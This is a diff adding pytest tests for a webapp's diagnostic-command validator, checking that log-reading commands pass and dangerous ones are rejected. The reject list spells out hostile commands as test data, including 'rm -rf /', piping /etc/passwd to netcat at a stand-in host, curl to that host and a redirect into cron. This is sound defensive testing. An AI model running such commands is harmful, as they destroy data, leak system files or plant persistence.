@@ -17,7 +17,36 @@ ROOT = Path(__file__).parent.parent
 sys.path.insert(0, str(ROOT))
 
 import webapp as _webapp
-from webapp import _client_ip, _login_attempts, _derive_token
+from webapp import _client_ip, _login_attempts, _derive_token, _validate_diag_cmd
+
+
+# ─────────────────────────── _validate_diag_cmd (R1) ───────────────────────────
+
+
+@pytest.mark.parametrize("cmd", [
+    "",  # unset
+    "journalctl -u claude-ops-bot",
+    "docker logs myapp",
+    "tail -f /var/log/app.log",
+    "head -n 50 /tmp/x.log",
+    "venv/bin/python -m pytest -q",
+    "/usr/bin/tail -n 100 /tmp/x",
+])
+def test_validate_diag_cmd_accepts_safe(cmd):
+    assert _validate_diag_cmd(cmd) is True
+
+
+@pytest.mark.parametrize("cmd", [
+    "rm -rf /",                       # tool not allowed
+    "journalctl -u x; rm -rf /",      # command chaining
+    "cat /etc/passwd | nc evil 1234", # pipe
+    "echo $(whoami)",                 # command substitution
+    "tail -f x && curl evil",         # &&
+    "tail -f x > /etc/cron.d/y",      # redirect
+    "sudo journalctl -u x",           # sudo not allowed
+])
+def test_validate_diag_cmd_rejects_dangerous(cmd):
+    assert _validate_diag_cmd(cmd) is False
 
 
 # ─────────────────────────── _client_ip ───────────────────────────
